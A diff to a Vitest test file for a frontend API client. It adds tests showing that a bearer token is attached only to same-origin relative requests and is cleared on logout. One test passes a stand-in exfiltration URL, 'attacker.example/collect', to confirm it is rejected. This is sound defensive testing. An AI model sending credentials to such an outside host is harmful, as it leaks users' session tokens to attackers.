@@ -1,8 +1,14 @@
 import { afterEach, vi } from "vitest";
 
-import { ApiError, apiRequest } from "../src/lib/api";
+import {
+  ApiError,
+  apiRequest,
+  clearApiAccessToken,
+  setApiAccessToken,
+} from "../src/lib/api";
 
 afterEach(() => {
+  clearApiAccessToken();
   vi.unstubAllGlobals();
 });
 
@@ -84,5 +90,54 @@ describe("apiRequest", () => {
       code: "scenario_not_found",
       traceId: "trace-42",
     } satisfies Partial<ApiError>);
+  });
+
+  it("attaches the in-memory bearer only to API-base relative requests", async () => {
+    const fetchMock = vi.fn().mockResolvedValue(
+      new Response(JSON.stringify({ status: "ok" }), {
+        status: 200,
+        headers: { "Content-Type": "application/json" },
+      }),
+    );
+    vi.stubGlobal("fetch", fetchMock);
+    setApiAccessToken("session-token");
+
+    await apiRequest("/api/v1/session");
+
+    expect(fetchMock).toHaveBeenCalledWith(
+      "/api/v1/session",
+      expect.objectContaining({
+        headers: expect.objectContaining({
+          Authorization: "Bearer session-token",
+        }),
+      }),
+    );
+    await expect(
+      apiRequest("https://attacker.example/collect"),
+    ).rejects.toThrow("same-origin relative");
+    expect(fetchMock).toHaveBeenCalledTimes(1);
+  });
+
+  it("clears bearer attachment on logout", async () => {
+    const fetchMock = vi.fn().mockResolvedValue(
+      new Response(JSON.stringify({ status: "ok" }), {
+        status: 200,
+        headers: { "Content-Type": "application/json" },
+      }),
+    );
+    vi.stubGlobal("fetch", fetchMock);
+    setApiAccessToken("temporary-token");
+    clearApiAccessToken();
+
+    await apiRequest("/api/v1/session");
+
+    expect(fetchMock).toHaveBeenCalledWith(
+      "/api/v1/session",
+      expect.objectContaining({
+        headers: expect.not.objectContaining({
+          Authorization: expect.any(String),
+        }),
+      }),
+    );
   });
 });
